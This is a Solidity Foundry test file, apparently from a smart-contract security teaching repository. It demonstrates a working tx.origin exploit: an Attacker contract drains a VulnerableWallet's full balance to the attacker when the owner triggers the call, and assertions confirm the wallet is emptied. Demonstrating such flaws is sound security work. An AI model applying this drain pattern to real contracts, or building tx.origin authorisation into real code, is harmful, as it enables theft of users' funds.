// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableWallet} from "../../src/access_control/TxOrigin.sol";

contract Attacker {
    VulnerableWallet public wallet;
    address public attackerAddress;

    constructor(VulnerableWallet _wallet, address _attackerAddress) {
        wallet = _wallet;
        attackerAddress = _attackerAddress;
    }

    function attack() external {
        wallet.transfer(payable(attackerAddress), wallet.getBalance());
    }

    receive() external payable {}
}

contract VulnerableWalletPoC is Test {
    VulnerableWallet wallet;
    Attacker attackerContract;

    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    uint256 initialAttackerBalance;

    function setUp() public {
        vm.deal(owner, 2 ether);
        vm.deal(attacker, 2 ether);

        vm.prank(owner);
        wallet = new VulnerableWallet();

        vm.prank(owner);
        wallet.deposit{value: 1 ether}();

        vm.prank(attacker);
        attackerContract = new Attacker(wallet, attacker);

        initialAttackerBalance = attacker.balance;

        assertEq(wallet.getBalance(), 1 ether);
    }

    function testExploitTxOrigin() public {
        vm.prank(owner, owner);
        attackerContract.attack();
        assertEq(wallet.getBalance(), 0);
        assertEq(attacker.balance, initialAttackerBalance + 1 ether);
    }
}
